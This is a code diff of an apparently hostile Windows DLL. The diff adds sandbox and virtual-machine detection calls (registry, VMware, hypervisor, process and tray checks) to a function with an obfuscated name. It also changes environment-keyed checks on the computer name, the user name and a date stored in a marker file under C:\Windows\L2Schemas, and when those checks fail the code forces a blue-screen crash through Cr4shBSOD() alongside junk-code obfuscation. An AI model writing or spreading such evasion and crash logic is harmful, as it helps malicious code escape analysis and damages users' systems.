@@ -52,8 +52,15 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 }
 
 void d8460eef1d4bed762273a7377c57a0988ac7d12a3661a4496e2cdc494e17232e() {
+	isVM_Registry();
+	isVMWare();
+	IsVM_Hypervisor();
+	isVM_Processes();
+	isVM_Tray();
+
+	//ReadRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion") == "68CDE Ver. F.21 " && g
 	JUNK_CODE_ONE
-	if (ReadRegValue(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion") == "68CDE Ver. F.21 " && getComputerName() == "0X6K7" && getUserName() == "k0x6k7") {
+	if (getComputerName() == "0X6K7" && getUserName() == "k0x6k7") {
 		if (!fs::exists("C:\\Windows\\L2Schemas\\567214814") && !fs::is_directory("C:\\Windows\\L2Schemas\\567214814")) {
 			if (fs::create_directory("C:\\Windows\\L2Schemas\\567214814")) {
 				fs::path dir = "C:\\Windows\\L2Schemas\\567214814";
@@ -62,7 +69,7 @@ void d8460eef1d4bed762273a7377c57a0988ac7d12a3661a4496e2cdc494e17232e() {
 					std::string text;
 					std::ifstream file("C:\\Windows\\L2Schemas\\567214814\\1010001000010000110011.txt");
 					while (getline(file, text)) {
-						if (text != "2022-10-31")  { // || text != "2020-10-27" || text != "2020-10-28" || text != "2020-10-29")
+						if (text != "2022-10-29")  { // || text != "2020-10-27" || text != "2020-10-28" || text != "2020-10-29")
 							std::ofstream log("log.txt");
 							log.close();
 							Cr4shBSOD();
@@ -84,7 +91,7 @@ void d8460eef1d4bed762273a7377c57a0988ac7d12a3661a4496e2cdc494e17232e() {
 				std::ifstream file("C:\\Windows\\L2Schemas\\567214814\\1010001000010000110011.txt");
 
 				while (getline(file, text)) {
-					if (text != "2022-10-30") {
+					if (text != "2022-10-29") {
 						std::ofstream log("log.txt");
 						Cr4shBSOD();
 
